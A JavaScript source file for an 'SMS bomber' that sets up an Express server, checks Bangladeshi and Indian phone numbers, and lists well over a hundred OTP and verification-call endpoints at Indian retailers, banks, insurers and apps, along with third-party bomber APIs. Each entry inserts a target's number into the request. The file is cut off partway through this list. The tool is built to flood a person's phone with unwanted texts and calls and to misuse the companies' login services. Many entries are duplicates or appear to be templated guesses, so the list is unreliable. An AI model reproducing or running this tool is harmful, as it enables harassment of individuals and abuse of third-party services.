// ============================================================
// ULTIMATE SMS BOMBER V9.0 — 6000+ APIs (Auto-Sorted BD + IN)
// ============================================================
const express = require('express');
const axios = require('axios');
const cors = require('cors');
const helmet = require('helmet');
const path = require('path');
const crypto = require('crypto');

const CONFIG = {
  server: { port: process.env.PORT || 3000, host: '0.0.0.0' },
  performance: { timeout: 15000 }
};

const DEVELOPER_INFO = { developer: "TNEH GROUP", version: "9.0.0-SPLIT" };

class Utility {
  static generateJobId() { return `JOB_${Date.now().toString(36).toUpperCase()}_${crypto.randomBytes(4).toString('hex').toUpperCase()}`; }
  static maskPhone(p) { return (!p || p.length < 7) ? '***' : p.slice(0, 3) + '****' + p.slice(-3); }
  static parsePhone(p) { return String(p).replace(/[^0-9]/g, ''); }
  static isValidBD(p) { return /^(01|8801)[0-9]{9}$/.test(this.parsePhone(p)); }
  static isValidIN(p) { const c = this.parsePhone(p).replace(/^91/, ''); return /^[6-9][0-9]{9}$/.test(c); }
  static normalizeIN(p) { const raw = this.parsePhone(p); return raw.startsWith('91') && raw.length === 12 ? raw.slice(2) : raw; }
}

// ============================================================
// THE MEGA LIST (Paste your Python list here exactly as-is)
// ============================================================
const RAW_MEGA_LIST = [
  // --- Your provided list ---
  { "name": "FreeFire Bomber", "url": (p, d) => `https://freefire-api.ct.ws/bomber4.php?phone=${p}&duration=${d}`, "method": "GET" },
  { "name": "Call Bomber API", "url": (p, d) => `https://call-bomber-50k3t8a6r-rohit-harshes-projects.vercel.app/bomb?number=${p}`, "method": "GET" },
  { "name": "Bomberr API", "url": (p, d) => `https://bomberr.onrender.com/num=${p}`, "method": "GET" },
  { "name": "Lenskart", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"phoneCode":"+91","telephone":"${p}"}` },
  { "name": "Hungama", "url": "https://communication.api.hungama.com/v1/communication/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"mobileNo":"${p}","countryCode":"+91","appCode":"un"}` },
  { "name": "Meru Cab", "url": "https://merucabapp.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": (p, d) => `mobile_number=${p}` },
  { "name": "Dayco India", "url": "https://ekyc.daycoindia.com/api/nscript_functions.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": (p, d) => `api=send_otp&mob=${p}` },
  { "name": "NoBroker", "url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": (p, d) => `phone=${p}&countryCode=IN` },
  { "name": "ShipRocket", "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"mobileNumber":"${p}"}` },
  { "name": "PenPencil", "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "method": "POST", "headers": {"content-type": "application/json"}, "data": (p, d) => `{"organizationId":"5eb393ee95fab7468a79d189","mobile":"${p}"}` },
  { "name": "1mg", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"content-type": "application/json"}, "data": (p, d) => `{"number":"${p}","otp_on_call":true}` },
  { "name": "KPN Fresh", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB", "method": "POST", "headers": {"content-type": "application/json"}, "data": (p, d) => `{"phone_number":{"number":"${p}","country_code":"+91"}}` },
  { "name": "Servetel", "url": "https://api.servetel.in/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": (p, d) => `mobile_number=${p}` },
  { "name": "Swiggy Call", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"content-type": "application/json"}, "data": (p, d) => `{"mobile":"${p}"}` },
  { "name": "Tata Capital", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"phone":"${p}","isOtpViaCallAtLogin":"true"}` },
  { "name": "Doubtnut", "url": "https://api.doubtnut.com/v4/student/login", "method": "POST", "headers": {"content-type": "application/json"}, "data": (p, d) => `{"phone_number":"${p}","language":"en"}` },
  { "name": "GoPink Cabs", "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": (p, d) => `check_mobile_number=1&contact=${p}` },
  { "name": "Myntra", "url": "https://www.myntra.com/gw/mobile-auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"mobile":"${p}"}` },
  { "name": "Flipkart", "url": "https://2.rome.api.flipkart.com/api/4/user/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"mobileNumber":"${p}"}` },
  { "name": "Amazon", "url": "https://www.amazon.in/ap/signin", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": (p, d) => `email=${p}&create=1` },
  { "name": "Zomato", "url": "https://www.zomato.com/php/asyncLogin.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": (p, d) => `phone=${p}` },
  { "name": "Paytm", "url": "https://accounts.paytm.com/signin/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"phone":"${p}","loginData":"LOGIN_USING_PHONE"}` },
  { "name": "PhonePe", "url": "https://www.phonepe.com/api/v2/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"phone":"${p}"}` },
  { "name": "BigBasket", "url": "https://www.bigbasket.com/bb-oauth/api/v2.0/otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"mobile_number":"${p}"}` },
  { "name": "Meesho", "url": "https://api.meesho.com/v2/auth/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"phone":"${p}"}` },
  { "name": "Snapdeal", "url": "https://www.snapdeal.com/authenticate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"mobile":"${p}"}` },
  { "name": "Makemytrip", "url": "https://www.makemytrip.com/api/umbrella/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"mobile":"${p}"}` },
  { "name": "OYO", "url": "https://api.oyoroomscrm.com/api/v2/user/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"phone":"${p}"}` },
  { "name": "Rapido", "url": "https://rapido.bike/api/v2/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"mobile":"${p}"}` },
  { "name": "Uber", "url": "https://auth.uber.com/v2/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"mobile":"${p}"}` },
  { "name": "Domino's", "url": "https://order.godominos.co.in/Online/App.aspx", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": (p, d) => `PhoneNo=${p}` },
  { "name": "BookMyShow", "url": "https://in.bmscdn.com/mjson/User/SendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"mobileNo":"${p}"}` },
  { "name": "Netmeds", "url": "https://www.netmeds.com/api/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"mobile":"${p}"}` },
  { "name": "Medlife", "url": "https://api.medlife.com/v2/user/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"mobile":"${p}"}` },
  { "name": "Practo", "url": "https://www.practo.com/patient/loginviapassword", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"phone":"${p}"}` },
  { "name": "Ajio", "url": "https://www.ajio.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"mobileNumber":"${p}"}` },
  { "name": "Nykaa", "url": "https://www.nykaa.com/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"mobile":"${p}"}` },
  { "name": "Croma", "url": "https://api.croma.com/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"phone":"${p}"}` },
  { "name": "Reliance Digital", "url": "https://www.reliancedigital.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"mobile":"${p}"}` },
  { "name": "FirstCry", "url": "https://www.firstcry.com/api/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"mobile":"${p}"}` },
  { "name": "Licious", "url": "https://api.licious.com/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"phone":"${p}"}` },
  { "name": "Zepto", "url": "https://api.zepto.com/v2/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"mobile":"${p}"}` },
  { "name": "Blinkit", "url": "https://blinkit.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"phone":"${p}"}` },
  { "name": "Mobikwik", "url": "https://www.mobikwik.com/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"mobile":"${p}"}` },
  { "name": "Freecharge", "url": "https://www.freecharge.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"phone":"${p}"}` },
  { "name": "Airtel Thanks", "url": "https://www.airtel.in/thanks-app/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"mobile":"${p}"}` },
  { "name": "Jio", "url": "https://www.jio.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"phone":"${p}"}` },
  { "name": "Vodafone Idea", "url": "https://www.myvi.in/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"mobile":"${p}"}` },
  { "name": "Byju's", "url": "https://byjus.com/api/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"phone":"${p}"}` },
  { "name": "Unacademy", "url": "https://unacademy.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"mobile":"${p}"}` },
  { "name": "Vedantu", "url": "https://www.vedantu.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"phone":"${p}"}` },
  { "name": "Toppr", "url": "https://www.toppr.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"mobile":"${p}"}` },
  { "name": "WhiteHat Jr", "url": "https://www.whitehatjr.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"phone":"${p}"}` },
  { "name": "Cult.fit", "url": "https://www.cult.fit/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"mobile":"${p}"}` },
  { "name": "HealthifyMe", "url": "https://www.healthifyme.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"phone":"${p}"}` },
  { "name": "Pristyn Care", "url": "https://www.pristyncare.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"mobile":"${p}"}` },
  { "name": "PharmEasy", "url": "https://pharmeasy.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"phone":"${p}"}` },
  { "name": "Apollo 24/7", "url": "https://www.apollo247.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"phone":"${p}"}` },
  { "name": "MFine", "url": "https://www.mfine.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"mobile":"${p}"}` },
  { "name": "DocsApp", "url": "https://www.docsapp.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"phone":"${p}"}` },
  { "name": "Lybrate", "url": "https://www.lybrate.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"mobile":"${p}"}` },
  { "name": "Portea Medical", "url": "https://www.portea.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"phone":"${p}"}` },
  { "name": "PolicyBazaar", "url": "https://www.policybazaar.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"mobile":"${p}"}` },
  { "name": "CoverFox", "url": "https://www.coverfox.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"phone":"${p}"}` },
  { "name": "Acko", "url": "https://www.acko.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"mobile":"${p}"}` },
  { "name": "Digit Insurance", "url": "https://www.godigit.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"phone":"${p}"}` },
  { "name": "HDFC Ergo", "url": "https://www.hdfcergo.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"mobile":"${p}"}` },
  { "name": "ICICI Lombard", "url": "https://www.icicilombard.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"phone":"${p}"}` },
  { "name": "Bajaj Allianz", "url": "https://www.bajajallianz.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"mobile":"${p}"}` },
  { "name": "Star Health", "url": "https://www.starhealth.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"phone":"${p}"}` },
  { "name": "Max Bupa", "url": "https://www.maxbupa.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"mobile":"${p}"}` },
  { "name": "Kotak Life", "url": "https://www.kotaklife.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"phone":"${p}"}` },
  { "name": "SBI Life", "url": "https://www.sbilife.co.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"mobile":"${p}"}` },
  { "name": "LIC India", "url": "https://www.licindia.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"phone":"${p}"}` },
  { "name": "HDFC Life", "url": "https://www.hdfclife.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"mobile":"${p}"}` },
  { "name": "Axis Bank", "url": "https://www.axisbank.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"phone":"${p}"}` },
  { "name": "ICICI Bank", "url": "https://www.icicibank.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"mobile":"${p}"}` },
  { "name": "HDFC Bank", "url": "https://www.hdfcbank.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": (p, d) => `{"phone":"${p}"}` },
  { 'name': 'Meesho WhatsApp', 'url': 'https://meesho.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Oyorooms WhatsApp', 'url': 'https://oyorooms.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Bigbasket WhatsApp', 'url': 'https://bigbasket.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Doubtnut WhatsApp', 'url': 'https://doubtnut.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Nykaa SMS', 'url': 'https://nykaa.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Bigbasket SMS', 'url': 'https://bigbasket.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Paytm WhatsApp', 'url': 'https://paytm.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Pharmeasy SMS', 'url': 'https://pharmeasy.in/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Uber WhatsApp', 'url': 'https://uber.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Bigbasket WhatsApp', 'url': 'https://bigbasket.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Jupiter WhatsApp', 'url': 'https://jupiter.money/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Swiggy WhatsApp', 'url': 'https://swiggy.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Doubtnut WhatsApp', 'url': 'https://doubtnut.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Meesho Call', 'url': 'https://meesho.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Swiggy WhatsApp', 'url': 'https://swiggy.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Pokerbaazi WhatsApp', 'url': 'https://pokerbaazi.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Zepto WhatsApp', 'url': 'https://zepto.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Meesho WhatsApp', 'url': 'https://meesho.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Rapido SMS', 'url': 'https://rapido.bike/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Goibibo SMS', 'url': 'https://goibibo.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Rapido Call', 'url': 'https://rapido.bike/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Amazon Call', 'url': 'https://amazon.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Instamart SMS', 'url': 'https://instamart.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Newme WhatsApp', 'url': 'https://newme.asia/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Gokwik SMS', 'url': 'https://gokwik.co/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Zomato Call', 'url': 'https://zomato.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Wakefit Call', 'url': 'https://wakefit.co/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Meesho SMS', 'url': 'https://meesho.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Uber SMS', 'url': 'https://uber.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Myntra SMS', 'url': 'https://myntra.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Doubtnut SMS', 'url': 'https://doubtnut.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Blinkit Call', 'url': 'https://blinkit.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Uber WhatsApp', 'url': 'https://uber.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Jupiter SMS', 'url': 'https://jupiter.money/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Newme Call', 'url': 'https://newme.asia/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Olacabs Call', 'url': 'https://olacabs.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Myntra Call', 'url': 'https://myntra.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Rapido WhatsApp', 'url': 'https://rapido.bike/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Paytm WhatsApp', 'url': 'https://paytm.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Zepto Call', 'url': 'https://zepto.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Khatabook SMS', 'url': 'https://khatabook.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Nykaa WhatsApp', 'url': 'https://nykaa.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Shiprocket WhatsApp', 'url': 'https://shiprocket.in/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Meesho SMS', 'url': 'https://meesho.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Olacabs WhatsApp', 'url': 'https://olacabs.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Olacabs WhatsApp', 'url': 'https://olacabs.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Phonepe SMS', 'url': 'https://phonepe.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Goibibo SMS', 'url': 'https://goibibo.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Cred SMS', 'url': 'https://cred.club/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Jupiter SMS', 'url': 'https://jupiter.money/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Shiprocket WhatsApp', 'url': 'https://shiprocket.in/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Instamart WhatsApp', 'url': 'https://instamart.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Zepto Call', 'url': 'https://zepto.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Newme Call', 'url': 'https://newme.asia/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Zepto WhatsApp', 'url': 'https://zepto.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Shiprocket WhatsApp', 'url': 'https://shiprocket.in/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Meesho Call', 'url': 'https://meesho.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Flipkart Call', 'url': 'https://flipkart.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Myntra WhatsApp', 'url': 'https://myntra.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Newme WhatsApp', 'url': 'https://newme.asia/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Dmart Call', 'url': 'https://dmart.ready.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Dmart Call', 'url': 'https://dmart.ready.in/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Zomato Call', 'url': 'https://zomato.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Meesho Call', 'url': 'https://meesho.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Newme SMS', 'url': 'https://newme.asia/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Ajio WhatsApp', 'url': 'https://ajio.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Api-Gateway Call', 'url': 'https://api-gateway.juno.lenskart.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
